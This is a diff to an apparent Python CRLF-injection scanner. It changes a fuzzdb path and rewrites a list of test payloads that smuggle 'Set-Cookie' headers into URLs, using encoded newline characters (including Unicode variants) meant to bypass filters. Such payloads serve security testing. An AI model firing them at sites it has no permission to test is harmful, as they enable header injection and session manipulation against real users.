@@ -22,7 +22,7 @@ import re
 
 # format output for logging
 FORMAT = '%(asctime)-15s %(message)s'
-FUZZDB = './fuzzdb'
+FUZZDB = '../fuzzdb'
 
 # colors for logging
 class bcolors:
@@ -64,8 +64,11 @@ class CrlfInj:
             '/?\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/../',
             '/?\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/%2e%2e/',
             '/?\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/../',
-            
-            '?lang=bar%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val%c4%8d%c4%8a%c4%8d%c4%8aHTTP/1.1%20200%20OK%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
+            '/?lang=%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val%c4%8d%c4%8a%c4%8d%c4%8a',
+            '/?lang=%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
+            '/?lang=%E5%98%8A%E5%98%8DSet-Cookie:%20crlf_test_cookie=crlf_test_val',
+            '/?lang=%E5%98%8D%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
+            '/?lang=%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val'
         ]
         self.test_params = [
             'crlf_test',
